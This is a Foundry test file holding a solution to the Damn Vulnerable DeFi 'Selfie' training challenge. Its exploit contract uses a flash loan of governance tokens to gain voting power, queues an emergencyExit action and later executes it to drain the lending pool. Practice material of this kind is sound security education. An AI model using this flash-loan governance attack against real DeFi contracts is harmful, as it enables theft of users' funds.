// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfiePoolExploit exploit = new SelfiePoolExploit(address(pool), address(token), address(governance));
        exploit.setup(address(recovery));

        vm.warp(block.timestamp + 2 days);
        exploit.close();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract SelfiePoolExploit is IERC3156FlashBorrower {
    SelfiePool public pool;
    DamnValuableVotes public damnToken;
    SimpleGovernance public governance;
    uint256 actionId;

    constructor(address _pool, address _token, address _governance) {
        pool = SelfiePool(_pool);
        damnToken = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
    }

    // callback for flashloan function
    // delegate vote from senders to address(this) and queue action (have enough votes because of FL)
    // give approval of tokens to pool (payback FL)
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        damnToken.delegate(address(this));
        uint256 _actionId = governance.queueAction(address(pool), 0, data);
        actionId = _actionId;
        IERC20(token).approve(address(pool), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // 1. get flashloan from pool
    function setup(address recovery) external returns (bool) {
        uint256 amount = 1_500_000e18;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnToken), amount, data);
    }

    // now with action queued and time limit passed, we can execute the action
    // bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
    function close() external returns (bool) {
        bytes memory result = governance.executeAction(actionId);
    }
}
